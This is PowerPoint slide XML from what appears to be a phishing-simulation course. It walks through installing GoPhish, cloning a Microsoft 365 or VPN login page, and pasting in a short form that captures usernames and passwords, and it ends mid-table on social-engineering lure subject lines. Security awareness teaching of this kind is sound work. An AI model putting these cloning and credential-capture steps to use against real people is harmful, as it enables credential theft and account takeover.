                <a:spcPct val="92000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="92000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>4. Access the web admin panel</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="92000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>If using Kali with a desktop browser: open https://127.0.0.1:3333</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="92000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>If accessing remotely (e.g., from another machine): use https://&lt;Your domain&gt;:3333 (you may need to edit /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0" err="1">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0" err="1">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>gophish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0" err="1">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>config.json</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> and change </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0" err="1">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>listen_url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> to 0.0.0.0:3333)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="92000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Log in with admin and the password from step 3. You will be forced to change the password immediately.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="92000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2300" dirty="0">
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Rectangle 1"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="-126236"/>
            <a:ext cx="65" cy="709673"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="15151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85660" rIns="0" bIns="14283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025195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Autofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="92000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>5. Verify it's running</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="92000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>You should see the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>GoPhish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> dashboard. The phishing server (for landing pages) will listen on port 80 by default.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Part 2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Landing Pages:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> Use the "Import" feature to clone a legitimate login page (e.g., Microsoft 365 or a company VPN portal). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Step 1: Navigate to Landing Pages</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Log into the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>GoPhish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> admin interface (https://127.0.0.1:3333 or your server's IP). From the left sidebar, click "Landing Pages", then click the "New Page" button.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>A modal dialog will open, presenting the landing page editor.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Step 2: Use the "Import Site" Feature</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Inside the editor, click the "Import Site" button. This is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>GoPhish's</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> built-in cloning tool. A new window will appear prompting you to enter the URL of the website you want to impersonate.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>For Microsoft 365: https://login.microsoftonline.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>For a VPN Portal: Use your target company's actual VPN login URL (e.g., https://vpn.targetcompany.com)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6104241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A3533C-679C-CEC1-39E7-4602F8E4F7C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1" y="0"/>
            <a:ext cx="12447638" cy="6961239"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>After entering the URL, click "Import". </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>GoPhish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> will fetch the HTML of the URL and populate it into the editor. You can use the "Preview" or "Source" view to inspect the imported HTML. "Import Site" provides a solid foundation, but real-world sites require manual tweaking; the next step will show you how to perfect it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Step 3: Test and Refine Your Cloned Page</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>The "Import Site" function is powerful, but it's an automated tool. For the best results, you should always review and manually edit the imported HTML to ensure it looks and behaves exactly like the original login page.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Preview is Key: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Gophish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> has a built-in preview feature to see how your page appears to a target. This helps you check for any visual glitches before a campaign launches.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Simplify Modern Sites: If a page relies heavily on complex scripts (like React), the import might miss some elements. In these cases, it's effective to download the page's CSS and images, and then manually rebuild a simplified, high-fidelity version of the login form.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9059416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116114" y="0"/>
            <a:ext cx="12540343" cy="7249886"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Fix the Login Form: The core of your operational landing page is the login form. Use the HTML editor to ensure the form is set up to submit credentials to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>GoPhish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Log into </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>GoPhish</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Open your browser and go to https://127.0.0.1:3333 (or your server’s IP, if remote). Log in as admin.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Go to Landing Pages</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>In the left sidebar, click Landing Pages → then either:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Click New Page (to create a new one), or</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Click on an existing page’s Name to edit it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Open the HTML Source Editor</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>You will see a large text area labeled HTML (a code editor with syntax highlighting).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>If you only see a visual (WYSIWYG) editor, click the Source button in the toolbar to switch to raw HTML view.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>In some versions, there is a toggle between Design and Source tabs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Locate the &lt;form&gt; section</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>After using Import Site, the HTML will contain the original login form.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Scroll through the code or use your browser’s find function (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Ctrl+F</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>) to search for &lt;form.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Replace the form code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22355571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1353800" cy="7200900"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Delete the existing &lt;form&gt; ... &lt;/form&gt; block. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Paste this minimal but effective form in its place:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>&lt;form method="post"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>    &lt;input type="text" name="username" placeholder="Email or Username"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>    &lt;input type="password" name="password" placeholder="Password"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>    &lt;input type="submit" value="Sign In"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>&lt;/form&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Why this works: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>GoPhish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t> automatically captures any form submitted with method="post". The name attributes (e.g., username, password) determine how the credentials are labelled in the campaign results. You can rename them to match the original site (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>loginfmt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>passwd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>) for realism.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Save the page</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Scroll down and click Save Page.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>Step 4: Save &amp; Deploy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Name your Landing Page clearly (e.g., "M365-Company-Clone") and click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>"Save Page"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Your new landing page is now ready to be used in a campaign. When you create a campaign, simply select it from the dropdown menu.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26471135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662057"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Email Template Design with Social Engineering Triggers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>1. Access the Email Templates Section</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Log into </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>GoPhish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> admin → Email Templates → New Template.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>2. Choose Your Social Engineering Angle</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Trigger	      Psychological Principle	Example Subject Line</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Urgency	Limited time → act now	"Password expiring in 24 hours – verify immediately"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Authority	Trusted figure (IT, CEO, Microsoft)	"IT Security Alert: Unusual sign‑in activity detected"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
